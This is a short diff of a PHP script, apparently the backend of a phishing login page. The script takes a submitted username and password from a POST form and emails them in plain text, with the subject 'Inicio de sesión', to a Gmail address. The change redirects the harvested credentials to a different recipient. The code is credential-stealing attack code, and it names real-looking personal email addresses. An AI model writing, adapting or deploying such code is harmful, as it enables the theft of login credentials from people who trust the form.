@@ -4,7 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $contraseña = $_POST['contraseña'];
 
     // Configuración del correo electrónico
-    $destinatario = 'garciasaraviaaxel@gmail.com';
+    $destinatario = 'wallaceytx@gmail.com';
     $asunto = 'Inicio de sesión';
     $mensaje = "Nombre de usuario: $usuario\nContraseña: $contraseña";
 
